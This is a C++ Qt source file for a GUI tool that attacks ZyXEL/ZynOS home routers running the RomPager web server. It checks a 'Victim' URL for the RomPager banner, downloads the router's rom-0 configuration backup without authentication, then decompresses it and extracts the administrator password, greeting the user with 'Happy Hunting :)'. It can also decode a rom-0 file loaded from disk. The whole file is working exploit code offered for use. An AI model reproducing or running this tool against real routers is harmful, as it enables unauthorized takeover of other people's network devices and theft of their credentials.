#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "decompressor.h"
#include <QFile>
#include <QDir>
#include <QNetworkCookie>
#include "fileutil.h"
#include <QDebug>
#include <QFileDialog>
#include <QMessageBox>
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    web = new HttpClass(this);

    setWindowFlags( (windowFlags() | Qt::CustomizeWindowHint) & ~Qt::WindowMaximizeButtonHint);

}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_btnCheck_clicked()
{
    ui->btnCheck->setEnabled(false);
    setStatusText("Checking Victim's Vendor ...");
    QString url = ui->txtURL->text();
    url = url.toLower();
    if(!url.startsWith(QString("http://")))
        url = QString("http://") + url ;
    if(!url.endsWith(QString("/")))
        url += "/";
    QString ZynOS = url + "Allegro";
    QString response = web->GetString(ZynOS);
    if(response == NULL){
        setStatusText("Connection faild .",1000);
    }else{
        if(response.contains(QString("RomPager"))){
            setStatusText(QString("It seems target is vulnerable :)"));
        }else{
            setStatusText(QString("It seems target is not vulnerable :("));
        }
        QNetworkCookieJar *jar = new QNetworkCookieJar(this);
        jar->insertCookie(QNetworkCookie("C6","rom0"));
        QString rom0 = url + "rom-0";
        QVariant response = web->GetBytes(rom0,jar);
        if(response.type() == QVariant::ByteArray){
            setStatusText("Starting Decryption",2000);
            QByteArray responseBytes = response.toByteArray();
            QByteArray *lza = FileUtil::getLZASection(&responseBytes);
            Decompressor decompressor(lza,this);
            QString temp = decompressor.Decompress();
            QString password = FileUtil::getPassword(temp);
            if(password.length() > 0){
                ui->txtPassword->setText(password);
                QMessageBox::information(this,"Decrypted","Happy Hunting :) ");
            }else{
                setStatusText("Unknown Vendor/Firmware");
            }
            delete lza ;
        }
        else if(response.type() == QVariant::String){
            setStatusText(QString("\"%1\"").arg(response.toString()));
        }
        else{
            setStatusText(QString("Logical Error"));
            qDebug() << response.type();
        }

    }
    ui->btnCheck->setEnabled(true);

}
void MainWindow::setStatusText(const QString &status,int Timeout){
    this->statusBar()->showMessage(status,Timeout);
}

void MainWindow::on_btnFile_clicked()
{
    QString mFile = QFileDialog::getOpenFileName(this,"Rom-0 File",QDir::homePath(),"rom-0");
    if(mFile.isEmpty())
        return;
    QFile file(mFile);
    file.open(QFile::ReadOnly);
    QByteArray *lza = FileUtil::getLZASection(&file);
    file.close();
    Decompressor decompressor(lza,this);
    QString temp = decompressor.Decompress();
    QString password = FileUtil::getPassword(temp);
    if(password.length() > 0){
        ui->txtPassword->setText(password);
        QMessageBox::information(this,"Decrypted","Happy Hunting :) ");
    }else{
        setStatusText("Unknown Vendor/Firmware");
    }
}

void MainWindow::on_txtPassword_returnPressed()
{
    emit ui->btnCheck->clicked();
}
